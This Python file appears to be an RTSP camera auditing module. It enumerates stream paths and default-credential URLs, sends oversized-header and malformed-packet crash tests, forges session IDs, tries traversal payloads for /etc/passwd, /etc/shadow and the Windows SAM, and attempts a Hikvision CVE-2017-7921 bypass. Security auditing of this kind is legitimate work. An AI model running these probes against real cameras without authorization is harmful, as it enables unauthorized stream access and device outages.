"""
RTSP Protocol Auditor - Tests for RTSP-specific vulnerabilities.
Covers: unauthenticated access, path enumeration, method abuse,
buffer overflows in headers, and session hijacking vectors.
"""

import socket
import re
import time
from concurrent.futures import ThreadPoolExecutor, as_completed


RTSP_PATHS = [
    "/", "/live", "/live/ch0", "/live/ch1", "/live/main",
    "/live/sub", "/live.sdp", "/media/video1",
    "/cam/realmonitor", "/cam1/h264", "/cam1/mpeg4",
    "/h264/ch1/main/av_stream", "/h264/ch1/sub/av_stream",
    "/Streaming/Channels/1", "/Streaming/Channels/101",
    "/Streaming/Channels/102", "/Streaming/Channels/201",
    "/videoMain", "/video1", "/video2",
    "/stream1", "/stream2", "/stream/main", "/stream/sub",
    "/1", "/1/1", "/1/stream1", "/2", "/11", "/12",
    "/ch0_0.h264", "/ch0_1.h264", "/ch1_0.h264",
    "/user=admin&password=&channel=1&stream=0.sdp",
    "/user=admin&password=admin&channel=1&stream=0.sdp",
    "/mpeg4/media.amp", "/mpeg4",
    "/media.amp", "/media/media.amp",
    "/onvif1", "/onvif2", "/onvif/media/1", "/onvif/media/2",
    "/axis-media/media.amp", "/axis-media/media.amp?camera=1",
    "/img/video.sav", "/img/media.sav",
    "/ipcam/stream.cgi?nowait",
    "/nphMpeg4/nil-320x240",
    "/rtpvideo1.sdp",
    "/snl/live/1/1", "/snl/live/1/2",
    "/MediaInput/h264", "/MediaInput/mpeg4",
    "/profile1", "/profile2", "/profile3",
    "/defaultPrimary0", "/defaultSecondary0",
    "/ucast/11", "/ucast/12",
    "/tcp/av0_0", "/tcp/av0_1",
    "/live/0/MAIN", "/live/0/SUB",
    "/live1.sdp", "/live2.sdp",
    "/streaming/channels/1/httppreview",
    "/Src/MediaInput/stream_1",
    "/h264Preview_01_main", "/h264Preview_01_sub",
    "/cam/video.mjpeg",
    "/av0_0", "/av0_1", "/av2_0",
    "/AVStream1_1", "/AVStream2_1",
    "/v2/live/ch1", "/v2/live/ch2",
]

RTSP_METHODS = [
    "OPTIONS", "DESCRIBE", "SETUP", "PLAY", "PAUSE",
    "TEARDOWN", "GET_PARAMETER", "SET_PARAMETER",
    "ANNOUNCE", "REDIRECT", "RECORD"
]


class RTSPAuditor:
    def __init__(self, target, port=554, timeout=5, verbose=0):
        self.target = target
        self.port = port
        self.timeout = timeout
        self.verbose = verbose
        self.findings = []
        self.cseq = 1

    def run(self):
        self._test_unauthenticated_access()
        self._enumerate_paths()
        self._test_method_abuse()
        self._test_header_overflow()
        self._test_session_manipulation()
        self._test_url_traversal()
        self._test_cve_exploits()
        return self.findings

    def _send_rtsp(self, request):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.timeout)
            sock.connect((self.target, self.port))
            sock.send(request.encode() if isinstance(request, str) else request)
            response = sock.recv(4096)
            sock.close()
            return response
        except (socket.timeout, socket.error, OSError) as e:
            if self.verbose >= 2:
                print(f"    [i] RTSP connection error: {e}")
            return None

    def _build_request(self, method, path="/", headers=None, body=None):
        uri = f"rtsp://{self.target}:{self.port}{path}"
        request = f"{method} {uri} RTSP/1.0\r\n"
        request += f"CSeq: {self.cseq}\r\n"
        self.cseq += 1

        if headers:
            for key, value in headers.items():
                request += f"{key}: {value}\r\n"

        if body:
            request += f"Content-Length: {len(body)}\r\n"
            request += f"\r\n{body}"
        else:
            request += "\r\n"

        return request

    def _parse_response(self, response):
        if not response:
            return None
        try:
            decoded = response.decode("utf-8", errors="replace")
            lines = decoded.split("\r\n")
            status_line = lines[0] if lines else ""
            status_code = None
            match = re.search(r"RTSP/1\.\d\s+(\d+)", status_line)
            if match:
                status_code = int(match.group(1))
            return {
                "status_code": status_code,
                "status_line": status_line,
                "headers": decoded,
                "raw": response
            }
        except Exception:
            return {"status_code": None, "raw": response}

    def _test_unauthenticated_access(self):
        if self.verbose:
            print("    [i] Testing unauthenticated RTSP access...")

        request = self._build_request("DESCRIBE", "/")
        response = self._parse_response(self._send_rtsp(request))

        if not response:
            return

        if response["status_code"] == 200:
            self.findings.append({
                "type": "rtsp_unauth_access",
                "severity": "critical",
                "title": "Unauthenticated RTSP Access",
                "description": "RTSP stream accessible without authentication",
                "target": f"rtsp://{self.target}:{self.port}/",
                "evidence": response["status_line"]
            })
            print("    [!] CRITICAL: Unauthenticated RTSP access!")
        elif response["status_code"] == 401:
            if self.verbose:
                print("    [i] RTSP requires authentication (401)")
            auth_header = re.search(r"WWW-Authenticate:\s*(.+)", response["headers"])
            if auth_header:
                auth_type = auth_header.group(1).strip()
                if "Basic" in auth_type:
                    self.findings.append({
                        "type": "rtsp_basic_auth",
                        "severity": "medium",
                        "title": "RTSP Using Basic Authentication",
                        "description": "RTSP uses Basic auth - credentials sent in cleartext",
                        "target": f"rtsp://{self.target}:{self.port}/",
                        "evidence": auth_type
                    })

    def _enumerate_paths(self):
        if self.verbose:
            print(f"    [i] Enumerating {len(RTSP_PATHS)} RTSP paths...")

        accessible = []

        def test_path(path):
            request = self._build_request("DESCRIBE", path)
            response = self._parse_response(self._send_rtsp(request))
            if response and response["status_code"] == 200:
                return path
            return None

        with ThreadPoolExecutor(max_workers=5) as executor:
            futures = {executor.submit(test_path, p): p for p in RTSP_PATHS}
            for future in as_completed(futures):
                result = future.result()
                if result:
                    accessible.append(result)
                    if self.verbose:
                        print(f"    [+] Accessible: rtsp://{self.target}:{self.port}{result}")

        if accessible:
            self.findings.append({
                "type": "rtsp_paths_exposed",
                "severity": "high",
                "title": "RTSP Streams Accessible",
                "description": f"{len(accessible)} RTSP path(s) accessible without auth",
                "target": f"rtsp://{self.target}:{self.port}",
                "evidence": accessible
            })
            print(f"    [+] Found {len(accessible)} accessible RTSP path(s)")

    def _test_method_abuse(self):
        if self.verbose:
            print("    [i] Testing RTSP method abuse...")

        for method in RTSP_METHODS:
            request = self._build_request(method, "/")
            response = self._parse_response(self._send_rtsp(request))

            if not response:
                continue

            if method == "SET_PARAMETER" and response["status_code"] == 200:
                self.findings.append({
                    "type": "rtsp_set_parameter",
                    "severity": "high",
                    "title": "RTSP SET_PARAMETER Allowed Without Auth",
                    "description": "Can modify camera parameters without authentication",
                    "target": f"rtsp://{self.target}:{self.port}/",
                    "evidence": f"SET_PARAMETER returned {response['status_code']}"
                })

            if method == "ANNOUNCE" and response["status_code"] == 200:
                self.findings.append({
                    "type": "rtsp_announce_allowed",
                    "severity": "high",
                    "title": "RTSP ANNOUNCE Method Allowed",
                    "description": "ANNOUNCE allowed - potential stream injection vector",
                    "target": f"rtsp://{self.target}:{self.port}/",
                    "evidence": f"ANNOUNCE returned {response['status_code']}"
                })

    def _test_header_overflow(self):
        if self.verbose:
            print("    [i] Testing RTSP header overflow...")

        overflow_tests = [
            ("CSeq", "A" * 5000),
            ("Session", "B" * 5000),
            ("Transport", "C" * 5000),
            ("User-Agent", "D" * 10000),
            ("Authorization", "Basic " + "E" * 8000),
            ("Content-Length", "9" * 20),
        ]

        for header_name, payload in overflow_tests:
            request = self._build_request(
                "OPTIONS", "/",
                headers={header_name: payload}
            )
            try:
                response = self._send_rtsp(request)
                if response is None:
                    self.findings.append({
                        "type": "rtsp_header_overflow",
                        "severity": "critical",
                        "title": f"RTSP Header Overflow Crash ({header_name})",
                        "description": f"Camera crashed/disconnected on oversized {header_name} header",
                        "target": f"rtsp://{self.target}:{self.port}/",
                        "evidence": f"No response after {header_name}: {'<payload>' if len(payload) > 50 else payload}"
                    })
                    print(f"    [!] CRITICAL: Possible crash with oversized {header_name}")
                    time.sleep(2)
            except Exception:
                pass

    def _test_session_manipulation(self):
        if self.verbose:
            print("    [i] Testing RTSP session manipulation...")

        fake_sessions = [
            "0", "1", "00000000", "12345678",
            "FFFFFFFF", "99999999", "-1",
            "A" * 256
        ]

        for session_id in fake_sessions:
            request = self._build_request(
                "PLAY", "/",
                headers={"Session": session_id}
            )
            response = self._parse_response(self._send_rtsp(request))

            if response and response["status_code"] == 200:
                self.findings.append({
                    "type": "rtsp_session_hijack",
                    "severity": "critical",
                    "title": "RTSP Session Hijacking Possible",
                    "description": f"PLAY accepted with forged session ID: {session_id}",
                    "target": f"rtsp://{self.target}:{self.port}/",
                    "evidence": f"Session {session_id} -> 200 OK"
                })
                print(f"    [!] CRITICAL: Session accepted with fake ID: {session_id}")
                break

    def _test_url_traversal(self):
        if self.verbose:
            print("    [i] Testing RTSP URL path traversal...")

        traversal_paths = [
            "/../../../etc/passwd",
            "/..%2f..%2f..%2fetc/passwd",
            "/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
            "/..\\..\\..\\windows\\system32\\config\\sam",
            "/live/../../../../etc/shadow",
            "/cam/../../../proc/self/environ",
            "/.%00/admin",
            "/live%00.sdp",
        ]

        for path in traversal_paths:
            request = self._build_request("DESCRIBE", path)
            response = self._parse_response(self._send_rtsp(request))

            if response and response["status_code"] == 200:
                raw_str = response.get("headers", "")
                if any(indicator in raw_str for indicator in ["root:", "daemon:", "WINDOWS", "[boot"]):
                    self.findings.append({
                        "type": "rtsp_path_traversal",
                        "severity": "critical",
                        "title": "RTSP Path Traversal",
                        "description": f"Path traversal successful: {path}",
                        "target": f"rtsp://{self.target}:{self.port}{path}",
                        "evidence": raw_str[:200]
                    })
                    print(f"    [!] CRITICAL: Path traversal: {path}")

    def _test_cve_exploits(self):
        """Test for known RTSP CVEs."""
        if self.verbose:
            print("    [i] Testing known RTSP CVEs...")

        # CVE-2017-7921 - Hikvision auth bypass
        request = self._build_request(
            "DESCRIBE", "/Streaming/Channels/1",
            headers={"Authorization": "Basic YWRtaW46MTEK"}
        )
        response = self._parse_response(self._send_rtsp(request))
        if response and response["status_code"] == 200:
            self.findings.append({
                "type": "cve_2017_7921",
                "severity": "critical",
                "title": "CVE-2017-7921: Hikvision Authentication Bypass",
                "description": "Hikvision RTSP auth bypass via crafted credentials",
                "target": f"rtsp://{self.target}:{self.port}/Streaming/Channels/1",
                "evidence": response["status_line"]
            })

        # Malformed RTSP version test
        malformed = f"DESCRIBE rtsp://{self.target}:{self.port}/ RTSP/2.0\r\nCSeq: 1\r\n\r\n"
        response = self._send_rtsp(malformed)
        if response is None:
            self.findings.append({
                "type": "rtsp_version_crash",
                "severity": "high",
                "title": "RTSP Version Confusion Crash",
                "description": "Camera crashes on non-standard RTSP version",
                "target": f"rtsp://{self.target}:{self.port}/",
                "evidence": "No response to RTSP/2.0 request"
            })

        # Interleaved binary data injection
        binary_payload = b"DESCRIBE rtsp://" + self.target.encode() + b"/ RTSP/1.0\r\n"
        binary_payload += b"CSeq: 1\r\n"
        binary_payload += b"Transport: RTP/AVP/TCP;interleaved=0-1\r\n\r\n"
        binary_payload += b"\x24\x00\x00\x04" + b"\xff" * 4
        response = self._send_rtsp(binary_payload)
        if response is None:
            self.findings.append({
                "type": "rtsp_interleaved_crash",
                "severity": "high",
                "title": "RTSP Interleaved Data Handling Issue",
                "description": "Camera crashes on unexpected interleaved binary data",
                "target": f"rtsp://{self.target}:{self.port}/",
                "evidence": "No response after interleaved binary injection"
            })
